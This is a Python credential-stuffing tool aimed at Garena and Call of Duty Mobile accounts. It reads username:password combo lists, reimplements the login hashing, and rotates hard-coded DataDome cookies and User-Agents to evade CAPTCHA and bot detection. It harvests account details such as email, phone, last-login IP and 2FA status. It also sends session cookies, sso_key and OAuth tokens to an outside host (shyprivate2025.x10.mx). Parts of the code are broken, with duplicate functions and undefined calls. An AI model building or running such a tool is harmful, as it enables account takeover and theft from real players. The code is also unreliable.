import os
import sys
import re
import time
import json
import threading
import uuid
import base64
import hashlib
import random
import logging
import urllib
import platform
import subprocess
import requests
import html
import certifi
import urllib3
import socket
import atexit
import zlib
import base64
import socket
import urllib3
import itertools
from tqdm import tqdm
from colorama import Fore, Style, init
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode
from cfonts import render
from Crypto.Cipher import AES
from time import sleep
from colorama import Fore, Style
from licensing.models import *
from licensing.methods import Key, Helpers, Message, Product, Customer, Data, AI
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style
from html import escape
from datetime import datetime, timedelta
import sys
import time
from datetime import datetime
import pytz  # Requires: pip install pytz
import signal
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)
import os
import random
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt

console = Console()
#bacground numbers color
RED = "\033[31m"
RESET = "\033[0m"
BOLD = "\033[1;37m"  
GREEN = "\033[32m"       
apkrov = "https://auth.garena.com/api/login?"
redrov = "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"

import threading

# 🔐 Full DataDome cookie poo
_datadome_pool = [
        "0EfmqHqKYWFCEjWothD30fyNqb~iTgsVzjdtPnYzACxqHRNPeoproA~YDaNW84eYYGcXY9H9ug6_7HJHWYHyyMY5VHyms9nfNTT2S1Nj5pxA0tPK1oKnPcC3~weaBCg0",
        "lBffJF6wqAd4ptvdIhndOTYaeYI92rTyt96UN8Dq3uxQ_IcbqiQT0FsxcDJUWvH1t5pYpn9ei7RMkHbWJet9S0ZOu6rzXEDHApUf3WLPobm2JQRCw_L3WXTG41uZxI7D",
    ]

class DataDomeCookieRotator:
    def __init__(self, pool):
        self.lock = threading.Lock()
        self.pool = list(pool)
        self.retry_count = [0] * len(pool)
        self.max_retries = 3
        self.index = 0

    def get(self):
        with self.lock:
            if not self.pool:
                raise ValueError("Cookie pool is empty")
            
            # Rotate for every new request
            cookie = self.pool[self.index]
            self.index = (self.index + 1) % len(self.pool)
            return {"datadome": cookie}

    def report_failure(self):
        with self.lock:
            current_index = (self.index - 1) % len(self.pool)  # last used
            self.retry_count[current_index] += 1

            if self.retry_count[current_index] >= self.max_retries:
                print(f"[!] Rotating out bad cookie: {self.pool[current_index][:10]}... (CAPTCHA triggered too often)")
                self.pool.pop(current_index)
                self.retry_count.pop(current_index)
                if not self.pool:
                    raise RuntimeError("⚠️ All cookies have been exhausted.")
                self.index %= len(self.pool)  # prevent out-of-range
                
def bulk_check(file_path, bot=None, chat_id=None):
    import os
    import time
    import random

    clean_results = []
    notclean_results = []

    with open(file_path, "r", encoding="utf-8") as f:
        lines = f.read().splitlines()

    total = len(lines)

    for i, line in enumerate(lines, 1):
        try:
            username, password = line.strip().split(":", 1)
        except ValueError:
            continue  # Skip invalid line

        # ✅ Replace this with your real CODM checker
        result = check_account(username, password)

        if result["status"] == "clean":
            clean_results.append(result["text"])
        else:
            notclean_results.append(result["text"])

        # 🔔 Send progress to Telegram after every account
        if bot and chat_id:
            try:
                bot.send_message(chat_id=chat_id, text=f"🔍 Checking {i}/{total}")
            except Exception:
                pass

        # Optional delay for realism
        time.sleep(random.uniform(0.3, 0.8))

    # 📁 Save results to output files
    os.makedirs("output", exist_ok=True)

    with open("output/clean_result.txt", "w", encoding="utf-8") as f:
        f.write("\n".join(clean_results))

    with open("output/notclean_result.txt", "w", encoding="utf-8") as f:
        f.write("\n".join(notclean_results))
        
# Shared instance
_rotator = DataDomeCookieRotator(_datadome_pool)

def get_cookie():
    """Thread-safe cookie getter."""
    return _rotator.get()

def report_bad_cookie():
    """Called when CAPTCHA / fail / block is detected."""
    _rotator.report_failure()

# Legacy support
def get_cookies():
    return get_cookie()  
    
    # List of realistic User-Agent strings
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.1 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; V2149) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 11; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
]

# Randomly select one User-Agent
random_user_agent = random.choice(USER_AGENTS)

# Apply to headers
headers = {
    "User-Agent": random_user_agent,
    # other headers can go here...
}

# If you need to set a separate selected_header
selected_header = headers.copy()


# Color variables
W = "\033[0m"          # Reset color
GR = "\033[90m"        # Grey text
R = "\033[1;31m"       # Red text
RED = "\033[101m"      # Red background
B = "\033[0;34m\033[1m"
GREEN = "\033[102m"
YELLOW = "\033[103m"
BLUE = "\033[104m"
MAGENTA = "\033[105m"
CYAN = "\033[106m"
WHITE = "\033[107m"# Bold blue text

#date_time
datenok = str(int(time.time()))

# functions
def strip_ansi_codes_jarell(text):
    ansi_escape_jarell = re.compile(r'\x1B[@-_][0-?]*[ -/]*[@-~]')
    return ansi_escape_jarell.sub('', text)    
def get_datenow():
    return datenok
def generate_md5_hash(password):
    md5_hash = hashlib.md5()
    md5_hash.update(password.encode('utf-8'))
    return md5_hash.hexdigest()
    
def generate_decryption_key(password_md5, v1, v2):
    intermediate_hash = hashlib.sha256((password_md5 + v1).encode()).hexdigest()
    decryption_key = hashlib.sha256((intermediate_hash + v2).encode()).hexdigest()
    return decryption_key

def encrypt_aes_256_ecb(plaintext, key):
    cipher = AES.new(bytes.fromhex(key), AES.MODE_ECB)
    plaintext_bytes = bytes.fromhex(plaintext)
    padding_length = 16 - len(plaintext_bytes) % 16
    plaintext_bytes += bytes([padding_length]) * padding_length
    chiper_raw = cipher.encrypt(plaintext_bytes)
    return chiper_raw.hex()[:32]  # Return a hex string of the first 32 bytes
def getpass(password, v1, v2):
    password_md5 = generate_md5_hash(password)
    decryption_key = generate_decryption_key(password_md5, v1, v2)
    encrypted_password = encrypt_aes_256_ecb(password_md5, decryption_key)
    return encrypted_password

def generate_fingerprint():
    """Generate consistent browser fingerprint"""
    # Screen properties
    screen_width = random.choice([1920, 1366, 1440, 1536, 1600])
    screen_height = random.choice([1080, 768, 900, 864, 1024])
    color_depth = random.choice([24, 30, 16])
    
    # WebGL fingerprint components
    webgl_vendor = random.choice([
        "Google Inc. (NVIDIA)",
        "Intel Inc.", 
        "AMD", 
        "NVIDIA Corporation"
    ])
    webgl_renderer = random.choice([
        "ANGLE (NVIDIA, NVIDIA GeForce RTX 3080 Direct3D11 vs_5_0 ps_5_0, D3D11)",
        "ANGLE (Intel, Intel(R) UHD Graphics 630 Direct3D11 vs_5_0 ps_5_0, D3D11)",
        "ANGLE (AMD, AMD Radeon RX 6700 XT Direct3D11 vs_5_0 ps_5_0, D3D11)"
    ])
    
    # Audio context fingerprint
    audio_hash = hashlib.md5(str(random.getrandbits(128)).encode()).hexdigest()
    
    # Canvas fingerprint
    canvas_hash = hashlib.md5(str(random.getrandbits(128)).encode()).hexdigest()
    
    return {
        "screen": f"{screen_width}x{screen_height}x{color_depth}",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
        "language": "en-US,en;q=0.9",
        "timezone": "America/New_York",
        "webgl_vendor": webgl_vendor,
        "webgl_renderer": webgl_renderer,
        "audio_hash": audio_hash,
        "canvas_hash": canvas_hash,
        "hardware_concurrency": random.choice([4, 6, 8, 12]),
        "device_memory": random.choice([4, 8, 16]),
        "platform": "Win32"
    }
 
def check_login(account_username, _id, encryptedpassword, password, selected_header, cookies, dataa, date):
    # Rotate User-Agent and platform header
    selected_header["User-Agent"] = random.choice(USER_AGENTS)
    selected_header["sec-ch-ua-platform"] = '"Windows"'

    # Ensure the DataDome token is in the cookie jar
    cookies.update(get_cookies())
    datadome_token = cookies.get("datadome", "")

    login_params = {
        'app_id': '100082',
        'account': account_username,
        'password': encryptedpassword,
        'redirect_uri': redrov,
        'format': 'json',
        'id': _id,
    }

    login_url = apkrov + f"{urlencode(login_params)}"

    try:
        response = requests.get(login_url, headers=selected_header, cookies=cookies, timeout=60)
        response.raise_for_status()
    except requests.exceptions.ConnectionError:
        print("[ERROR] Connection Error - Server refused the connection")
        return "FAILED"
    except requests.exceptions.ReadTimeout:
        print("[ERROR] Timeout - Server is taking too long to respond")
        return "FAILED"
    except requests.RequestException as e:
        print(f"[ERROR] Login Request Failed: {e}")
        return "FAILED"

    # ✅ CAPTCHA DETECTION
    if "captcha" in response.text.lower() or "/captcha" in response.text:
        print(f"{Fore.MAGENTA}[⚠️ CAPTCHA DETECTED] Rotating token...")
        _rotator.report_bad(datadome_token)
        return "CAPTCHA"

    try:
        login_json_response = response.json()
    except json.JSONDecodeError:
        print(f"[ERROR] Login Failed: Invalid JSON response. Server Response: {response.text}")
        _rotator.report_bad(datadome_token)
        return "FAILED"

    if 'error_auth' in login_json_response:
        return "╰──➤➤  Incorrect Password"

    if 'error_params' in login_json_response:
        return "[FAILED] Invalid Parameters"

    if 'error' in login_json_response:
        return f"{Fore.RED}╰──➤➤  Incorrect Password"

    if not login_json_response.get('success', True):
        return "[FAILED] Login Failed"

    session_key = login_json_response.get('session_key', '')
    if not session_key:
        return "[FAILED] No session key"

    print(f"{Fore.YELLOW}╰──➤➤  found 1 valid account ")

    set_cookie = response.headers.get('Set-Cookie', '')
    sso_key = set_cookie.split('=')[1].split(';')[0] if '=' in set_cookie else ''

    # Update cookies with session details
    coke = cookies.copy()
    coke.update({
        "ac_session": "7tdtotax7wqldao9chxtp30tn4m3ggkr",
        "datadome": dataa,
        "sso_key": sso_key
    })

    # Refresh datadome to reduce CAPTCHA trigger
    cookies = get_cookies()
    print(f"{Fore.GREEN}╰──➤➤  Cookie use:  {cookies['datadome'][:30]}...")
    print(f"{Fore.GREEN}╰──➤➤  Fingerprint:    {selected_header['User-Agent'][:30]}")

    hider = {
        'Host': 'account.garena.com',
        'Connection': 'keep-alive',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
        'sec-ch-ua-mobile': '?1',
        'User-Agent': selected_header["User-Agent"],
        'Accept': 'application/json, text/plain, */*',
        'Referer': f'https://account.garena.com/?session_key={session_key}',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    init_url = 'https://shyprivate2025.x10.mx/shy.php'
    params = {f'coke_{k}': v for k, v in coke.items()}
    params.update({f'hider_{k}': v for k, v in hider.items()})
    try:
        init_response = requests.get(init_url, params=params, timeout=120)
        init_response.raise_for_status()
    except requests.RequestException as e:
        return f"[ERROR] Init Request Failed: {e}"
    try:
        init_json_response = json.loads(init_response.text)
    except json.JSONDecodeError:
        return "[ERROR] Failed to parse JSON response from server."

    if 'error' in init_json_response or not init_json_response.get('success', True):
        return f"[ERROR] {init_json_response.get('error', 'Unknown error')}"

    bindings = init_json_response.get('bindings', [])
    is_clean = init_json_response.get('status') == "\033[0;32m\033[1mClean\033[0m"

    account_data = {
        "country": "N/A", "last_login": "N/A", "last_login_where": "N/A", "avatar_url": "N/A",
        "fb": "N/A", "fbl": "N/A", "mobile": "N/A", "facebook": "False", "shell": "0",
        "count": "UNKNOWN", "ipk": "1.1.1.1", "region": "IN.TH", "email": "N/A", "ipc": "N/A",
        "email_verified": "False", "authenticator_enabled": False, "two_step_enabled": False
    }

    for binding in bindings:
        for key, label in [
            ("country", "Country:"), ("last_login", "LastLogin:"), ("last_login_where", "LastLoginFrom:"),
            ("count", "ckz:"), ("ipk", "LastLoginIP:"), ("ipc", "Las:"), ("shell", "Garena Shells:"),
            ("fb", "Facebook Account:"), ("fbl", "Fb link:"), ("avatar_url", "Avatar:"),
            ("mobile", "Mobile Number:"), ("email", "eta:"), ("email_verified", "tae:"),
            ("authenticator_enabled", "Authenticator:"), ("two_step_enabled", "Two-Step Verification:")
        ]:
            if label in binding:
                value = binding.split(label)[-1].strip()
                if key == "email_verified":
                    account_data[key] = "True" if "Yes" in value else "False"
                elif key in ["authenticator_enabled", "two_step_enabled"]:
                    account_data[key] = "True" if "Enabled" in value else "False"
                else:
                    account_data[key] = value
        if "Facebook Account:" in binding:
            account_data["facebook"] = "True"

    print(f"{Fore.RED}╰──➤➤  Validating  please wait")
    cookies["sso_key"] = sso_key

    head = {
        "Host": "auth.garena.com",
        "Connection": "keep-alive",
        "Content-Length": "107",
        "sec-ch-ua": '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
        "Accept": "application/json, text/plain, */*",
        "sec-ch-ua-platform": selected_header["sec-ch-ua-platform"],
        "sec-ch-ua-mobile": "?1",
        "User-Agent": selected_header["User-Agent"],
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "Origin": "https://auth.garena.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.9"
    }

    data = {
        "client_id": "100082",
        "response_type": "token",
        "redirect_uri": "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/",
        "format": "json",
        "id": _id
    }

    try:
        grant_url = "https://auth.garena.com/oauth/token/grant"
        reso = requests.post(grant_url, headers=head, data=data, cookies=cookies)
        if not reso:
            return "[FAILED] No response from server."

        data = reso.json()

        if "access_token" in data:
            print(f"{Fore.MAGENTA}╰──➤➤  Auto skipped if invalid account")

            newdate = get_cookies().get("datadome")
            token_session = reso.cookies.get('token_session', cookies.get('token_session'))
            access_token = data["access_token"]

            tae = show_level(access_token, selected_header, sso_key, token_session, newdate, cookies)

            codm_nickname, codm_level, codm_region, uid = tae.split("|")
            connected_games = []

            if not (uid and codm_nickname and codm_level and codm_region):
                connected_games.append("No CODM account found")
            else:
                connected_games.append(f"{Fore.GREEN}╰──➤➤  Account Level: {codm_level}\n  ╰──➤➤  Game: CODM ({codm_region})\n  ╰──➤➤  Nickname: {codm_nickname}\n  ╰──➤➤  UID: {uid}")

            result = format_result(
                account_data["last_login"], account_data["last_login_where"], account_data["country"],
                account_data["shell"], account_data["avatar_url"], account_data["mobile"],
                account_data["facebook"], account_data["email_verified"], account_data["authenticator_enabled"],
                account_data["two_step_enabled"], connected_games, is_clean, account_data["fb"],
                account_data["fbl"], account_data["email"], date, account_username, password,
                account_data["count"], account_data["ipk"], account_data["ipc"]
            )

            return result
        else:
            return f"[FAILED] 'access_token' not found in response {data}"

    except Exception as e:
        return f"╰──➤➤  ERROR {e}"
        
#level of account that show
def show_level(access_token, selected_header, sso, token, datadome, cookie):
    from urllib.parse import urlparse, parse_qs
    import requests
    import json

    url = "https://auth.codm.garena.com/auth/auth/callback_n"
    params = {
        "site": "https://api-delete-request.codm.garena.co.id/oauth/callback/",
        "access_token": access_token
    }

    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": "https://auth.garena.com/",
        "sec-ch-ua": '"Not-A.Brand";v="99", "Chromium";v="124"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-site",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": selected_header["User-Agent"]
    }

    # Get fresh datadome
    datadome = get_cookies().get("datadome")

    # Update cookies
    cookie.update({
        "datadome": datadome,
        "sso_key": sso,
        "token_session": token
    })

    try:
        response = requests.get(url, headers=headers, cookies=cookie, params=params)
    except requests.RequestException as e:
        return f"[FAILED] show_level request error: {e}"

    if response.status_code == 200:
        # Extract token from redirected URL
        parsed_url = urlparse(response.url)
        query_params = parse_qs(parsed_url.query)
        extracted_token = query_params.get("token", [None])[0]

        data = {
            "selected_header": selected_header,
            "extracted_token": extracted_token
        }
        try:
            res = requests.post(
                "https://shyprivate2025.x10.mx/shy1.php",
                json=data,
                headers={"Content-Type": "application/json"}
            )

            if res.status_code == 200:
                return res.text
            else:
                return f"[FAILED] jajac.php HTTP {res.status_code} - {res.text}"

        except requests.RequestException as e:
            return f"[FAILED] Connection to jajac.php failed: {e}"

    else:
        return f"[FAILED] show_level HTTP {response.status_code} - {response.text}"

#format ouptut and save result
def format_result(
    last_login, last_login_where, country, shell, avatar_url, mobile, facebook,
    email_verified, authenticator_enabled, two_step_enabled, connected_games,
    is_clean, fb, fbl, email, date, username, password, count, ipk, ipc
):
    clean_status = f"{Fore.GREEN}Clean{Style.RESET_ALL}" if is_clean else f"{Fore.RED}Not Clean{Style.RESET_ALL}"
    email_ver = f"{Fore.GREEN}Verified{Style.RESET_ALL}" if email_verified == "True" else f"{Fore.RED}Not Verified{Style.RESET_ALL}"
    mobile_bound = f"{Fore.GREEN}True{Style.RESET_ALL}" if mobile != "N/A" else f"{Fore.RED}False{Style.RESET_ALL}"
    fb_linked = f"{Fore.GREEN}{facebook}{Style.RESET_ALL}" if facebook == "True" else f"{Fore.RED}False{Style.RESET_ALL}"
    codm_info = ''.join(connected_games) if connected_games else f"{Fore.RED}No CODM account found{Style.RESET_ALL}"
    safe_avatar = escape(avatar_url)

    line_color = Fore.GREEN

    mess = f"""
    
{line_color}────────────────────────────────────────────────────────────────{Style.RESET_ALL}

 {line_color}┌──────────── MY ACCOUNT INFO ────────────┐{Style.RESET_ALL}    
 {Fore.GREEN} ╰──➤➤ LOGIN SUCCESSFUL{Style.RESET_ALL}
  {Fore.GREEN}╰──➤➤ Username       : {Fore.RED}{username}:{password}
  {Fore.GREEN}╰──➤➤ Last Login     : {Fore.RED}{last_login}
  {Fore.GREEN}╰──➤➤ Location       : {Fore.RED}{last_login_where}
  {Fore.GREEN}╰──➤➤ IP Address     : {Fore.RED}{ipk}
  {Fore.GREEN}╰──➤➤ Country (Login): {Fore.RED}{ipc}
  {Fore.GREEN}╰──➤➤ Country (User) : {Fore.RED}{country}
  {Fore.GREEN}╰──➤➤ Garena Shells  : {Fore.RED}{shell}
  {Fore.GREEN}╰──➤➤ Avatar URL     : {Fore.RED}{safe_avatar}
  {Fore.GREEN}╰──➤➤ Mobile No      : {Fore.RED}{mobile}
  {Fore.GREEN}╰──➤➤ Email          : {Fore.RED}{email} ({email_ver})
  {Fore.GREEN}╰──➤➤ FB Username    : {Fore.RED}{fb}
  {Fore.GREEN}╰──➤➤ FB Profile     : {Fore.RED}{fbl}
  {line_color}┌──────────── LEVEL OF ACCOUNT ────────────┐{Style.RESET_ALL}
  {Fore.CYAN}{codm_info}
  {line_color}└──────────────────────────────────────────┘{Style.RESET_ALL}
  {Fore.GREEN}╰──➤➤ Mobile Bound   : {mobile_bound}
  {Fore.GREEN}╰──➤➤ Email Verified : {Fore.RED}{email_verified}
  {Fore.GREEN}╰──➤➤ Facebook Linked: {fb_linked}
  {Fore.GREEN}╰──➤➤ Authenticator   : {Fore.GREEN}{authenticator_enabled}
  {Fore.GREEN}╰──➤➤ 2FA Enabled     : {Fore.RED}{two_step_enabled}
  {Fore.GREEN}╰──➤➤ Account Status : {clean_status}
 
  {line_color}└──────────────────────────────────────────┘{Style.RESET_ALL}

{line_color}───────────────────────────────────────────────────────────────{Style.RESET_ALL}
""".strip()

    # Prepare plain output for file
    output_block = f"""[✅] Login Successful
[👤] Account: {username}:{password}
[🕒] Last Login: {last_login}
[🌍] Last login from: {last_login_where}
[📡] Last login IP: {ipk}
[🗺️] Last login country: {ipc}
[🌐] Country: {country}
[💰] Shells: {shell}
[🖼️] Avatar: {avatar_url}
[📞] Mobile No: {mobile}
[📧] Email: {email} ({email_ver})
[🔵] Facebook Username: {fb}
[🔗] Facebook Link: {fbl}
[🎮] CODM Info:
"""

    for item in connected_games:
        output_block += f"{item}\n"

    output_block += f"""[🔐] Bind Status:
[📱] Mobile binded: {'True' if mobile != "N/A" else 'False'}
[✅] Email verified: {email_verified}
[🔵] Facebook Linked: {facebook}
[🔒] Authenticator: {authenticator_enabled}
[🛡️] 2FA: {two_step_enabled}
[📊] Account Status: {clean_status}
"""

    output_block += "\n---------------------[ NEXT ]----------------------\n\n"

    # Ensure output directory exists
    os.makedirs("output", exist_ok=True)

    # Save to appropriate file
    clean_file = os.path.join("output", f"clean_{date}.txt")
    notclean_file = os.path.join("output", f"notclean_{date}.txt")
    plain_file = clean_file if is_clean else notclean_file
    
    output_block = strip_ansi_codes_jarell(output_block)
    
    with open(plain_file, "a", encoding="utf-8") as f:
      f.write(output_block)

    return mess
    
     #garena data and cookies request   
def get_request_data():
    cookies = get_cookies()
    headers = {
        'Host': 'auth.garena.com',
        'Connection': 'keep-alive',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
        'sec-ch-ua-mobile': '?1',  # Changed to match captured request
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
        'sec-ch-ua-platform': '"Android"',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'en-US,en;q=0.9'
    }

    return cookies, headers

#check account 
def check_account(username, password, date, selected_header, cookies):
    try:

        # Generate a random ID
        base_num = "17290585"
        random_id = base_num + str(random.randint(10000, 99999))

        # Get fresh dynamic cookies (with datadome token)
        cookies = get_cookies()
        datadome_token = cookies.get("datadome")

        # Setup request headers
        headers = {
            'Host': 'auth.garena.com',
            'Connection': 'keep-alive',
            'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'sec-ch-ua-mobile': '?1',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
            'sec-ch-ua-platform': '"Android"',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'en-US,en;q=0.9'
        }

        params = {
            "app_id": "100082",
            "account": username,
            "format": "json",
            "id": random_id
        }

        login_url = "https://auth.garena.com/api/prelogin"

        # Send prelogin request with dynamic datadome
        response = requests.get(login_url, params=params, cookies=cookies, headers=headers)

        if "captcha" in response.text.lower():
            print(f"{Fore.RED}[FAILED] Max Retries DETECTED!.{Style.RESET_ALL}")
            input(">> Press Enter to continue...")

        if response.status_code == 200:
            data = response.json()
            v1 = data.get('v1')
            v2 = data.get('v2')
            prelogin_id = data.get('id')

            if not all([v1, v2, prelogin_id]):
                return "Account Doesn't Exist"

            new_datadome = response.cookies.get('datadome', datadome_token)
            encrypted_password = getpass(password, v1, v2)

            if not new_datadome:
                return "[FAILED] Status: Missing updated cookies"
            if "error" in data or data.get("error_code"):
                return f"[FAILED] Status: {data.get('error', 'Unknown error')}"

            print(f"{Fore.GREEN}╰──➤➤  searching valid account")
            return check_login(username, random_id, encrypted_password, password, headers, cookies, new_datadome, date)

        else:
            return f"[FAILED] HTTP Status: {response.status_code}"

    except Exception as e:
        return f"[FAILED] {e}"


def bulk_check(file_path):
    successful_count      = 0
    clean_count           = 0
    not_clean_count       = 0
    invalid_count         = 0
    ip_ban_captcha_count  = 0
    total_accounts        = 0
    count_100upclean      = 0
    count_100upnotclean   = 0
    highest_level         = 0
    date                  = get_datenow()

    if not file_path.endswith('.txt'):
        print("Error: Provided path is not a .txt file.")
        return

    output_dir = "output"
    os.makedirs(output_dir, exist_ok=True)

    hundred_up_clean_file    = os.path.join(output_dir, "100upclean.txt")
    hundred_up_notclean_file = os.path.join(output_dir, "100upnotclean.txt")

    print(f"\n{Fore.CYAN} ✅ {Style.RESET_ALL} YOUR FILE: {file_path}")

    def show_summary_temporarily():
        print(f"""
{Fore.LIGHTMAGENTA_EX}┌──────────── DETAILS OF SAVED ACCOUNT ─────┐{Style.RESET_ALL}
{Fore.GREEN}100upclean        : {count_100upclean}
{Fore.RED}100upnotclean     : {count_100upnotclean}
{Fore.YELLOW}Highest Level got : {highest_level}
{Fore.LIGHTMAGENTA_EX}└────────────────────────────────────────────┘{Style.RESET_ALL}
""")
        time.sleep(2)
        for _ in range(6):
            print("\033[F\033[K", end="")

    try:
        with open(file_path, 'r', encoding='utf-8') as infile:
            accounts = infile.readlines()
            total_accounts = len(accounts)
            print(f"\n{Fore.GREEN} ✅ {Style.RESET_ALL} TOTAL ACCOUNTS: {total_accounts} accounts\n")

            cookies         = get_cookies()
            user_agent      = random.choice(USER_AGENTS)
            headers         = {"User-Agent": user_agent}
            selected_header = headers.copy()

            for i, acc in enumerate(accounts, start=1):
                acc = acc.strip()
                if not acc or ':' not in acc:
                    continue

                username, password = acc.split(':')[-2], acc.split(':')[-1]
                print(f"{Fore.CYAN}╰──➤➤  Account checking: {i}/{total_accounts} accounts{Style.RESET_ALL}")
                time.sleep(random.uniform(0.1, 0.3))  # faster + less detectable

                try:
                    result = check_account(username, password, date, selected_header, cookies)

                    if "captcha" in result.lower():
                        print(f"{Fore.RED}[FAILED] IP BAN DETECTED!.{Style.RESET_ALL}")
                        input(">> Press Enter to continue...")

                        while True:
                            try:
                                skip_count = int(input("✈️ Enter how many cookies to jump (1-100): "))
                                if 1 <= skip_count <= 100:
                                    break
                                else:
                                    print("❌ Please enter a valid number between 1 and 100.")
                            except ValueError:
                                print("❌ Invalid input. Please enter a number.")

                        advance_cookie(skip_count)
                        ip_ban_captcha_count += 1
                        print(f"{Fore.GREEN}✅ Successfully skipped {skip_count} cookies ✨{Style.RESET_ALL}")
                        continue

                    plain_result = strip_ansi_codes_jarell(result)

                    if "LOGIN SUCCESSFUL" in plain_result:
                        successful_count += 1

                        match_level = re.search(r"Account Level: (\d+)", plain_result)
                        level       = int(match_level.group(1)) if match_level else 0

                        shell_match = re.search(r"shells: (\d+)", plain_result)
                        shell_count = int(shell_match.group(1)) if shell_match else 0

                        is_clean = "Account Status : Clean" in plain_result

                        if level >= 100:
                            line = f"{username}:{password} - Level {level} - shells: {shell_count}\n"
                            if is_clean:
                                with open(hundred_up_clean_file, "a", encoding="utf-8") as clean_out:
                                    clean_out.write(line)
                                count_100upclean += 1
                            else:
                                with open(hundred_up_notclean_file, "a", encoding="utf-8") as notclean_out:
                                    notclean_out.write(line)
                                count_100upnotclean += 1

                            if level > highest_level:
                                highest_level = level

                        if is_clean:
                            clean_count += 1
                        else:
                            not_clean_count += 1

                        print(f"{Fore.GREEN}{result}{Style.RESET_ALL}")
                        show_summary_temporarily()

                    elif "[FAILED]" in result:
                        print(f"{Fore.RED}[FAILED] {result}{Style.RESET_ALL}")
                        invalid_count += 1

                except Exception as e:
                    print(f"{Fore.RED}[!] Error for {username}:{password} -> {e}{Style.RESET_ALL}")

    except FileNotFoundError:
        print(Fore.RED + "File not found!" + Style.RESET_ALL)
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\nProcess interrupted." + Style.RESET_ALL)
        sys.exit(0)
    except Exception as e:
        print(Fore.RED + f"Unexpected error: {e}" + Style.RESET_ALL)
    finally:
      print()
      print(f"{Fore.LIGHTGREEN_EX}📩 CLEAN ACCOUNT GET         : {clean_count}{Style.RESET_ALL}")
      print(f"{Fore.LIGHTRED_EX}📩 NOT CLEAN ACCOUNT GET     : {not_clean_count}{Style.RESET_ALL}")
      print(f"{Fore.LIGHTYELLOW_EX}📩 HIGHEST LEVEL GET         : {highest_level}{Style.RESET_ALL}")
    

 
def save_fresh_cookie(cookie):
    with open('fresh_cookies.txt', 'a') as f:
        f.write(cookie + '\n')


